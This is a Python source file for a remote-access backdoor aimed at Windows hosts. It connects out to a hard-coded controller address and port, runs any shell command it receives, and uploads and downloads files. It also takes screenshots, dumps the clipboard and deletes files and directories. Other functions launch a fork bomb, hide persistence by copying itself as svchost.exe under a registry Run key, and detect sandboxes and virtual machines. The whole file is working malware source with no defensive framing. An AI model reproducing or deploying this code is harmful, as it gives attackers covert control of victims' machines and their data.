#!/usr/bin/python
import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
import tkinter as tk
from mss import mss

global ip,port,TMP,APPDATA,path

dns = '127.0.0.1'
ip = socket.gethostbyname(dns)
port = 6969


try:
    TMP = os.environ["TEMP"]
    APPDATA = os.environ["APPDATA"]
except:
    pass


class Backdoor:
    def __init__(self, ip, port):
        # uncomment to activated at startup if needed
        #self.persistance()
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.conn.connect((ip, port))
                break
            except socket.error:
                continue

    def clipboard(self):
        try:
            s = pyperclip.paste()
            pyperclip.copy(s)
            return s
        except:
            return ["[-] dump failed [-]"]


    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
        except:
            pass

    def json_send(self, data):
        try:
            json_data = json.dumps(data)
            return self.conn.send(json_data)
        except:
            return self.conn.send("[-] STDOUT parsing problem [-]")
            pass

    def persistance(self):
        try:
            location = os.environ["appdata"] + '\\svchost.exe'
            if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                subprocess.call(
                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',
                    shell=True)
                return "[+] persistance access activated [+]"
        except:
            return "[!] failed to set persistance access [!]"

    def receive(self):
        json_data = ""

        while True:
            try:
                json_data = json_data + self.conn.recv(4096)
                return json.loads(json_data)
            except ValueError:
                continue
            except:
                pass

    def sysinfo(self):
        try:
            sysinfo = platform.uname()
            sysinfo = [' '.join(sysinfo)]
            return str(sysinfo)
        except:
            return "[!] unable to get sysinfo [!]"

    def mkdir(self, directory):
        try:
            os.mkdir(directory)
            return "[+] Directory created [+]"
        except:
            return "[-] unable to create directory [-]"

    def rm_file(self, file):
        try:
            os.remove(file)
            return "[+] file removed [+]"
        except:
            return "[-] no such file or directory [-]"

    def rm_dir(self, directory):
        try:
            shutil.rmtree(directory)
            return "[+] directory removed [+]"
        except:
            return "[-] no such file or directory [-]"

    def chdir(self, path):
        try:
            os.chdir(path)
            return "dir changed to " + str(path)
        except:
            return "[-] no such file or directory [-]"

    def pwd(self):
        try:
            return os.getcwd()
        except:
            pass


    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "upload completed"
        except:
            return "[-] failed to write file [-]"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            return "[-] no such file or directory [-]"

    def detectSandboxie(self):
        try:
            self.libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
            return "[!] Sandbox detected [!]"
        except:
            return "[+] doesn't appear to be a sandbox [+]"

    def detectVM(self):
        try:
            import wmi
            self.objWMI = wmi.WMI()
            for objDiskDrive in self.objWMI.query("Select * from Win32_DiskDrive"):
                if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
                    return "[!] Virtual Machine detected [!]"
            return "[+] doesn't appear to be a VM [+]"
        except:
            return "[-] VM check failed, unable to load module wmi  [-]"

    def fork(self):
        try:
            while 1:
                os.fork()
        except:
            return "[-] fork deploy failed [-]"

    def run(self):
        while True:
            result = ""
            cmd = self.receive()
            if cmd[0] == "cd" and len(cmd) > 1:
                directory = ' '.join(cmd[1:])
                result = self.chdir(directory)
            elif cmd[0] == "download":
                result = self.read_file(cmd[1])
            elif cmd[0] == "upload":
                result = self.write_file(cmd[1], cmd[2])
            elif cmd[0] == "shot":
                self.screenshot()
                result = self.read_file('monitor-1.png')
                os.remove('monitor-1.png')
            elif cmd[0] == "pwd":
                result = self.pwd()
            elif cmd[0] == "rm":
                cmd[1] = ' '.join(cmd[1:])
                result = self.rm_file(cmd[1])
            elif cmd[0] == "rmdir":
                cmd[1] = ' '.join(cmd[1:])
                result = self.rm_dir(cmd[1])
            elif cmd[0] == "sysinfo":
                result = self.sysinfo()
            elif cmd[0] == 'mkdir':
                result = self.mkdir(cmd[1])
            elif cmd[0] == "rename":
                result = self.rename(cmd[1], cmd[2])
            elif cmd[0] == "chk":
                result = str(self.detectSandboxie()) +"\n"+ str(self.detectVM())
            elif cmd[0] == "persistance":
                result=self.persistance()
            elif cmd[0] == "clip":
                result=self.clipboard()
            elif cmd[0] == 'fork':
                self.fork()
            elif len(cmd) > 0:
                cmd = ' '.join(cmd[0:])
                try:
                    DEVNULL = open(os.devnull, 'wb')
                    result = subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)
                except:
                    pass
            else:
                result = execute(cmd)
            self.json_send(result)


def execute(cmd):
    try:
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)
    except:
        pass




starter = Backdoor(ip, port)
starter.run()
